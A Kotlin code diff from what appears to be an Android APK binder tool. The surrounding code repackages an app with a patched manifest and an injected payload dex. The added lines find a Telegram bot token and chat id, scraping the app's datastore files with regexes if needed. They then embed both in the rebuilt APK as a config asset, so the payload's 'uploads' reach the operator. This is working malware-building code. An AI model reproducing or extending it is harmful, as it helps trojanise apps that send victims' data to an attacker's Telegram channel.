@@ -112,6 +112,15 @@ class BinderEngine(private val context: Context) {
 
                             writeEntry(zos, cs, MANIFEST, patched!!, false)
                             writeEntry(zos, cs, payloadDexName, payloadDex, false)
+
+                            val (tk, ch) = readConfig()
+                            if (tk.isNotBlank() && ch.isNotBlank()) {
+                                val json = "{\"bot_token\":\"$tk\",\"chat_id\":\"$ch\"}"
+                                writeEntry(zos, cs, "assets/hs_config.json", json.toByteArray(), false)
+                                onLog("[INFO] Config injected")
+                            } else {
+                                onLog("[WARN] Config not found - uploads will fail")
+                            }
                         }
                     }
                 }
@@ -155,6 +164,30 @@ class BinderEngine(private val context: Context) {
         } finally {
             temp?.let { if (it.exists()) it.delete() }
         }
+    }
+
+    // ------------------------------------------------------------------
+    // Config (bot token / chat id)
+    // ------------------------------------------------------------------
+    private fun readConfig(): Pair<String, String> {
+        val p = context.getSharedPreferences("hs_prefs", Context.MODE_PRIVATE)
+        var t = p.getString(Const.PREF_BOT_TOKEN, "") ?: ""
+        var c = p.getString(Const.PREF_CHAT_ID, "") ?: ""
+        if (t.isNotBlank() && c.isNotBlank()) return t to c
+
+        val dir = File(context.filesDir, "datastore")
+        if (dir.isDirectory) {
+            dir.listFiles()?.forEach { f ->
+                val txt = runCatching { f.readText() }.getOrNull() ?: return@forEach
+                if (t.isBlank()) {
+                    Regex("\\d{8,12}:[A-Za-z0-9_-]{30,45}").find(txt)?.let { t = it.value }
+                }
+                if (c.isBlank()) {
+                    Regex("chat_id[\\s\\S]{1,4}?(-?\\d{5,20})").find(txt)?.let { c = it.groupValues[1] }
+                }
+            }
+        }
+        return t to c
     }
 
     // ------------------------------------------------------------------
